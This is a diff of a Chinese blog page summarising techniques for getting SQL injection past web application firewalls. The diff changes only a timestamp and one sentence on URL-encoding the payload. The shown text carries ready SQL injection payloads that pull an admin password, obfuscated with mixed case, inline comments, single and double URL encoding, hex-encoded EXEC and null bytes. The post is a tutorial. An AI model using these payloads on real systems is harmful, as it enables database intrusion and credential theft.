@@ -104,7 +104,7 @@
 <meta property="og:image" content="http://yoursite.com/2017/08/17/WAF绕过技术总结/filename.png">
 <meta property="og:image" content="http://yoursite.com/2017/08/17/WAF绕过技术总结/tab.png">
 <meta property="og:image" content="http://yoursite.com/2017/08/17/WAF绕过技术总结/mysql测试.jpg">
-<meta property="og:updated_time" content="2017-12-14T07:51:24.861Z">
+<meta property="og:updated_time" content="2017-12-21T06:28:26.108Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="WAF绕过技术总结">
 <meta name="twitter:description" content="WAF绕过技术使用大小写变种有的过滤器会过滤掉SQL语句中的关键字，比如SELECT,FROM等，因为数据库使用不区分大小写的方式来处理SQL关键字，所以可以使用大小写变种来绕过，例如：    &amp;#39; UNION SELECT password FROM USERS WHERE username=&amp;#39;admin&amp;#39;--可以替换成：    &amp;#39; UNiON SelECT pas">
@@ -422,7 +422,7 @@
 <h2 id="使用内联注释"><a href="#使用内联注释" class="headerlink" title="使用内联注释"></a>使用内联注释</h2><p>有的过滤器会过滤掉注入语句中的空格字符，可以考虑使用内联注释的方法绕过：<br>    <code>&#39;/**/UNION/**/SELECT/**/password/**/FROM/**/USERS/**/WHERE/**/username=&#39;admin&#39;--</code><br>如果同时过滤了‘=’，可以使用‘LIKE’关键字来替换：<br>    <code>&#39;/**/UNION/**/SELECT/**/password/**/FROM/**/USERS/**/WHERE/**/username/**/LIKE/**/&#39;admin&#39;--</code><br>注意：在MySQL中，甚至可以在关键字中使用内联注释来绕过WAF的关键字拦截：<br>    <code>&#39;/**/UN/**/ION/**/SEL/**/ECT/**/password/**/FR/**/OM/**/USERS/**/WH/**/ERE/**/username/**/LIKE/**/&#39;admin&#39;--</code><br><strong>实际测试中，该方法行不通。</strong><br><img src="/2017/08/17/WAF绕过技术总结/mysql注释替换空格.jpg" alt=""><br><a id="more"></a><br><img src="/2017/08/17/WAF绕过技术总结/mssql注释替换空格.jpg" alt=""></p>
 <h2 id="使用URL编码"><a href="#使用URL编码" class="headerlink" title="使用URL编码"></a>使用URL编码</h2><p>有的过滤器会过滤空格和内联注释序列/*，但是无法阻止以URL编码表示的注释序列。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%2F%2A*/UNION%2F%2A*/SELECT%2F%2A*/password%2F%2A*/FROM%2F%2A*/USERS%2F%2A*/WHERE%2F%2A*/username%2F%2A*/LIKE%2F%2A*/<span class="string">'admin'</span>--</div></pre></td></tr></table></figure></p>
 <p>以上这种方式如果不起作用的话，可以考虑使用URL双编码，即对上面攻击语句中的‘%’在一次进行URL编码，比如单引号的URL编码为%27，再一次编码为%2527（%的URL编码为%25）：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%252F%252A*/UNION%252F%252A*/SELECT%252F%252A*/password%252F%252A*/FROM%252F%252A*/USERS%252F%252A*/WHERE%252F%252A*/username%252F%252A*/LIKE%252F%252A*/<span class="string">'admin'</span>--</div></pre></td></tr></table></figure></p>
-<p>或者将真个注入语句进行URL编码。</p>
+<p>或者将真个注入语句进行URL编码。<br>如果想将特殊字符带入到数据库中执行，建议将输入得到语句全部进行URL编码之后发送。</p>
 <h2 id="使用16进制编码"><a href="#使用16进制编码" class="headerlink" title="使用16进制编码"></a>使用16进制编码</h2><p>使用十六进制数来实例化字符串：<br>    <code>SELECT password FROM USERS</code><br>16进制编码为：0x53454C4543542070617373776F72642046524F4D205553455253，可以按照下面的构造来动态执行：<br>    <code>DECLARE @query VARCHAR(100) SELECT @query = 0x53454C4543542070617373776F72642046524F4D205553455253 EXEC(@query)</code></p>
 <h2 id="使用空字节"><a href="#使用空字节" class="headerlink" title="使用空字节"></a>使用空字节</h2><p>在IPS和WAF等硬件设备中，这些设备考虑到性能的因素，一般使用原生语言编写，比如C++，对于这些语言，空字节代表字符串的结尾。过滤器如果遇到空字节，后面的内容不会处理，可以使用下面的语句来绕过：<br>    <code>%00&#39; UNION SELECT password FROM USERS WHERE username=&#39;admin&#39;--</code></p>
 <h2 id="嵌套剥离后的表达式"><a href="#嵌套剥离后的表达式" class="headerlink" title="嵌套剥离后的表达式"></a>嵌套剥离后的表达式</h2><p>有些过滤器会剥离用户输入中的特性字符，但是不会做递归处理，所以有如下方式：<br>seselectlect</p>
